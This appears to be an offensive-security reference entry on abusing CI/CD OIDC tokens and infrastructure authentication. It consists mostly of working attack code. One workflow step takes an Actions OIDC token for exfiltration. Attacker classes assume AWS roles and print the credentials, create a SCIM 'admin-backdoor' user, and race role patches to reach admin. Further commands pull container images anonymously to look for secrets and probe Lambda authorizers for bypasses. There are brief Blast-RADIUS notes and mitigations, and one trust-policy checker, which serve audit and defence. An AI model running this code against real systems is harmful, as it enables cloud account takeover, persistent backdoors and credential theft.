# KB-36: CI/CD OIDC Token Abuse & Infrastructure Auth Attacks

## Overview

CI/CD platforms issue OIDC tokens for keyless authentication to cloud providers. Misconfigured trust policies allow attackers to escalate from code execution to cloud admin.

---

## 1. GitHub Actions OIDC Token Abuse

### 1.1 Token Theft from Workflow

```yaml
# Malicious workflow step to exfiltrate OIDC token
- name: Get OIDC Token
  run: |
    TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
    # Token contains: repo, ref, sha, workflow, actor
    # If AWS trust policy only checks repo, any workflow in that repo can assume the role
```

### 1.2 AWS Trust Policy Exploitation

```python
class CICDOIDCAttacker:
    def __init__(self):
        self.sts_client = None

    def exploit_github_actions_oidc(self, oidc_token, role_arn):
        import boto3
        client = boto3.client('sts')
        try:
            resp = client.assume_role_with_web_identity(
                RoleArn=role_arn,
                RoleSessionName='cicd-exploit',
                WebIdentityToken=oidc_token
            )
            creds = resp['Credentials']
            print(f"[CRITICAL] Assumed role: {role_arn}")
            print(f"  AccessKeyId: {creds['AccessKeyId']}")
            return creds
        except Exception as e:
            print(f"[-] Failed: {e}")

    def check_trust_policy_weakness(self, role_arn):
        import boto3, json
        iam = boto3.client('iam')
        role_name = role_arn.split('/')[-1]
        try:
            policy = iam.get_role(RoleName=role_name)['Role']['AssumeRolePolicyDocument']
            for stmt in policy.get('Statement', []):
                condition = stmt.get('Condition', {})
                string_like = condition.get('StringLike', {})
                string_equals = condition.get('StringEquals', {})
                sub_condition = string_like.get('token.actions.githubusercontent.com:sub', '')
                if '*' in str(sub_condition):
                    print(f"[CRITICAL] Wildcard in sub condition: {sub_condition}")
                if not any('ref' in str(v) for v in [string_like, string_equals]):
                    print(f"[HIGH] No branch restriction — any branch can assume role")
                if not any('workflow' in str(v) for v in [string_like, string_equals]):
                    print(f"[HIGH] No workflow restriction — any workflow can assume role")
        except Exception as e:
            print(f"[-] Cannot read policy: {e}")
```

### 1.3 GitLab CI OIDC Abuse

```bash
# GitLab CI provides OIDC via CI_JOB_JWT_V2
# Token claims: namespace_path, project_path, ref, ref_type
# Weak trust: checking only namespace allows any project in group

# Extract token in CI job
echo $CI_JOB_JWT_V2 | base64 -d | jq .

# Use with AWS
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::ACCOUNT:role/gitlab-role \
  --web-identity-token "$CI_JOB_JWT_V2" \
  --role-session-name gitlab-exploit
```

---

## 2. SCIM Provisioning Attacks

```python
class SCIMAttacker:
    def __init__(self, scim_endpoint, bearer_token):
        self.endpoint = scim_endpoint.rstrip('/')
        self.headers = {'Authorization': f'Bearer {bearer_token}',
                        'Content-Type': 'application/scim+json'}

    def enumerate_users(self):
        resp = requests.get(f"{self.endpoint}/Users", headers=self.headers)
        if resp.status_code == 200:
            users = resp.json().get('Resources', [])
            for u in users:
                print(f"  {u.get('userName')} - {u.get('id')}")
            return users

    def create_admin_user(self):
        user = {
            "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
            "userName": "admin-backdoor@target.com",
            "name": {"givenName": "Admin", "familyName": "Backdoor"},
            "emails": [{"value": "admin-backdoor@target.com", "primary": True}],
            "active": True,
            "roles": [{"value": "admin"}],
            "groups": [{"value": "administrators"}]
        }
        resp = requests.post(f"{self.endpoint}/Users", headers=self.headers, json=user)
        if resp.status_code in [200, 201]:
            print(f"[CRITICAL] Admin user created via SCIM!")

    def race_condition_escalation(self):
        import concurrent.futures
        def patch_role(user_id):
            return requests.patch(f"{self.endpoint}/Users/{user_id}",
                headers=self.headers,
                json={"Operations": [{"op": "replace", "path": "roles",
                       "value": [{"value": "admin"}]}]})
        # Race: patch role while user is being provisioned
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futures = [ex.submit(patch_role, "target-user-id") for _ in range(20)]
```

---

## 3. Blast-RADIUS (CVE-2024-3596)

```
CVSS: 9.0 (Critical)
Attack: MD5 collision in RADIUS Access-Request forgery

# The RADIUS protocol uses MD5 for packet authentication
# An attacker on the network path can forge Access-Accept responses
# This bypasses all RADIUS-based authentication (WiFi, VPN, NAC)

# Detection: Check if RADIUS traffic is over UDP (vulnerable)
# vs. RADIUS over TLS (RadSec) — not vulnerable

# Testing:
# 1. Capture RADIUS traffic between NAS and RADIUS server
# 2. Use MD5 chosen-prefix collision to forge Access-Accept
# 3. NAS accepts forged response — user authenticated without valid credentials

# Mitigation: Deploy RadSec (RADIUS over TLS) or Message-Authenticator attribute
```

---

## 4. Container Registry Auth Bypass

```bash
# Docker Registry API v2 — check for anonymous access
curl -s https://registry.target.com/v2/ | head
curl -s https://registry.target.com/v2/_catalog
curl -s https://registry.target.com/v2/<repo>/tags/list
curl -s https://registry.target.com/v2/<repo>/manifests/latest

# Pull image without auth
docker pull registry.target.com/internal-app:latest
# Inspect for secrets
docker history --no-trunc registry.target.com/internal-app:latest
```

## 5. Serverless Auth — Lambda Authorizer Bypass

```python
def test_lambda_authorizer_bypass(api_gateway_url):
    # Test 1: Missing Authorization header may return cached allow
    resp = requests.get(f"{api_gateway_url}/admin")

    # Test 2: Empty bearer token
    resp = requests.get(f"{api_gateway_url}/admin",
                        headers={'Authorization': 'Bearer '})

    # Test 3: Authorizer timeout — if Lambda times out, API Gateway may allow
    resp = requests.get(f"{api_gateway_url}/admin",
                        headers={'Authorization': 'Bearer ' + 'A' * 100000})

    # Test 4: Cache poisoning — if authorizer caches by token prefix
    # Valid user's cached auth may apply to attacker's request
```

## References

- GitHub Actions OIDC security hardening documentation
- GitLab CI/CD OIDC documentation
- CVE-2024-3596: Blast-RADIUS
- SCIM RFC 7644
- AWS Lambda Authorizer documentation
